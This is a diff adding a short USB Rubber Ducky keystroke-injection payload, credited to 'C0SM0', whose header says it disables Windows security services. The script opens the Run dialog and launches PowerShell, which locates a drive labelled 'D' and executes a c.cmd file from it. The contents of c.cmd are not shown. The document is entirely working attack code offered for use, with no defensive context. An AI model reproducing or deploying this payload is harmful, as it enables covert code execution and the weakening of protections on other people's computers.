@@ -1,0 +1,8 @@
+REM Ducky payload that disables windows security services
+REM created by : C0SM0
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell /c $u=gwmi Win32_Volume|?{$_.Label -eq'D'}|select name;cd $u.name;./c.cmd
